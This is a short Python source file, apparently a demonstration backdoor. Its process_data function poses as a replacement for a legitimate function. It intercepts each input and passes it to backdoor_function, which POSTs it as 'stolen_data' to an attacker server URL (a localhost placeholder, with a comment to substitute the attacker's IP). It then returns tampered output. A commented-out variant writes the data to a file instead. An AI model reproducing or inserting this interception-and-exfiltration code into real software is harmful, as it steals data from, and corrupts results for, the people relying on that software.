import os
import requests

def ensure_directory_exists(directory):
    """
    Ensure the directory exists, create it if it doesn't.
    """
    if not os.path.exists(directory):
        os.makedirs(directory)


# Replace this with the attacker's server URL or public IP
SERVER_URL = "http://127.0.0.1:5000/receive-data"

# def backdoor_function(data):
#     """
#     Simulate stealing data by writing it to a file.
#     """
#     exfiltration_path = "D:/victim-repository/config.txt"
    
#     # Ensure the directory exists
#     ensure_directory_exists(os.path.dirname(exfiltration_path))
    
#     try:
#         # Save sensitive data to a file
#         with open(exfiltration_path, "a") as file:
#             file.write(f"Stolen Data: {data}\n")
#         print(f"Data exfiltrated to {exfiltration_path}.")
#     except Exception as e:
#         print(f"Error writing to file: {e}")


def backdoor_function(data):
    """
    Exfiltrate data to the attacker's server.
    """
    try:
        # Send the data to the attacker's server
        response = requests.post(SERVER_URL, data={"stolen_data": data})
        if response.status_code == 200:
            print("Data successfully exfiltrated to the server.")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending data to server: {e}")
def hello_world(name):
    print(f"Hello, {name}!")

def process_data(data):
    """
    Replace the legitimate function to intercept and exfiltrate data.
    """
    print(f"Intercepted data: {data}")
    
    # Exfiltrate the data
    backdoor_function(data)
    
    # Return tampered output
    return f"[Tampered Output] {data}"
